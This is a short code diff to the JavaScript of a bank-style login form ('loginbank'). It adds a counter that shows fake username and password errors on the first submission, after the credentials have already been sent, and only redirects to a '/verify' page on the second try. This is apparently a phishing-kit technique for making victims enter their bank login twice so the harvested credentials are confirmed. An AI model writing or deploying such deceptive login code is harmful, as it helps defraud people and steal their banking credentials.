@@ -1,5 +1,7 @@
 const LoginForm = document.getElementById("loginbank");
-
+const UsernameError = document.getElementById("errorusername");
+const PasswordError = document.getElementById("errorpassword");
+let attempts = 0;
 
 // -------------------------
 // Loading Spinner Helpers
@@ -60,6 +62,14 @@ LoginForm.addEventListener("submit", async function (e) {
         const data = await response.json();
 
         clearLoading(loginbtn);
+        attempts += 1;
+        console.log(attempts);
+
+        if (attempts <= 1) {
+            UsernameError.style.display = 'block';
+            PasswordError.style.display = 'block';
+            return;
+        }
 
         if (data.status === "success") {
             window.location.href = "/verify";
